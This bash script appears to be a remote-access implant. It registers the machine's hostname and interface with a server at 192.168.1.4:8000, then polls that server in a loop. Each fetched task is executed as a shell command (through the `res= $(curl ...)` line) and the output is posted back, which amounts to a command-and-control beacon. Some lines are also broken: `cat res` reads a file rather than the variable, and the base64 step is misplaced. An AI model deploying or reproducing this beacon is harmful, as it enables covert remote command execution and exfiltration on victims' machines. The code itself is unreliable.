#!/bin/bash
ip="192.168.1.4"
port="8000"
interface="eth0"
n=.3

regl="http://$ip:$port/reg/"

declare -A data=( [eth]=$interface [hname]=$(hostname) )

echo $data
name=$(curl -X POST -F eth=$interface -F hname=$(hostname) $regl) 

taskl="http://$ip:$port/tasks/$name/"
resultl="http://$ip:$port/results/$name/"

while :
do  
    res= $(curl $taskl) | base64
    cat res > /tmp/result
    curl -X POST --data "@/tmp/result" $resultl 
    rm /tmp/result
    sleep $n
done
